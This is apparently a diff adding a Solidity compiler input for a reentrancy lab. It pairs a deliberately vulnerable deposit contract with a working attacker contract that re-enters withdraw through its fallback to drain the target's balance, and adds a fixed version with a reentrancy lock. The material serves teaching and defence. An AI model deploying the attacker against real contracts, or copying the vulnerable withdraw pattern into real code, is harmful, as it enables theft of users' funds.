@@ -1,0 +1,25 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "ReentrancyLab.sol": {
+      "content": "pragma solidity ^0.4.24;\n\n// Original assignment contract. Use only in a local lab.\ncontract Dangerous {\n    mapping(address => uint) deposits;\n\n    function depositMoney() public payable {\n        deposits[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint amount) public {\n        require(deposits[msg.sender] >= amount);\n        if (!msg.sender.call.value(amount)()) {\n            revert();\n        }\n        deposits[msg.sender] -= amount;\n    }\n}\n\ncontract IDangerous {\n    function depositMoney() public payable;\n    function withdraw(uint amount) public;\n}\n\n// Demonstrates the vulnerability against the supplied local lab contract.\ncontract ReentrancyAttacker {\n    IDangerous public target;\n    address public owner;\n    uint public chunk;\n\n    constructor(address targetAddress) public {\n        target = IDangerous(targetAddress);\n        owner = msg.sender;\n    }\n\n    function attack() public payable {\n        require(msg.sender == owner);\n        require(msg.value > 0);\n        chunk = msg.value;\n        target.depositMoney.value(msg.value)();\n        target.withdraw(chunk);\n        owner.transfer(address(this).balance);\n    }\n\n    function() public payable {\n        uint remaining = address(target).balance;\n        if (remaining > 0) {\n            target.withdraw(remaining < chunk ? remaining : chunk);\n        }\n    }\n}\n\n// Same compiler and payment syntax, with effects before interactions and a lock.\ncontract FixedDangerous {\n    mapping(address => uint) public deposits;\n    bool private entered;\n\n    modifier nonReentrant() {\n        require(!entered);\n        entered = true;\n        _;\n        entered = false;\n    }\n\n    function depositMoney() public payable {\n        deposits[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint amount) public nonReentrant {\n        require(deposits[msg.sender] >= amount);\n        deposits[msg.sender] -= amount;\n        require(msg.sender.call.value(amount)());\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "evmVersion": "byzantium",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "metadata"
+        ]
+      }
+    }
+  }
+}
